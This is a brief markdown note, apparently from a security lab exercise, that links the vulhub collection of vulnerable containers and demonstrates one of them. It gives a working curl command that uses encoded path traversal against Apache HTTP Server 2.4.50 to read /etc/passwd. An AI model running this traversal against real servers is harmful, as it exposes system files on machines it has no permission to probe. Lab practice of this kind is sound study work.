**Vulnerable container List**
https://github.com/vulhub/vulhub
We tried to run these containers and execute vulnerabilities
As an example Apache HTTP Server 2.4.50 container have vulnerability  where you can see the folders you not access to:
by running this code
```
curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
```
![enter image description here](https://github.com/vulhub/vulhub/raw/master/httpd/CVE-2021-42013/1.png)
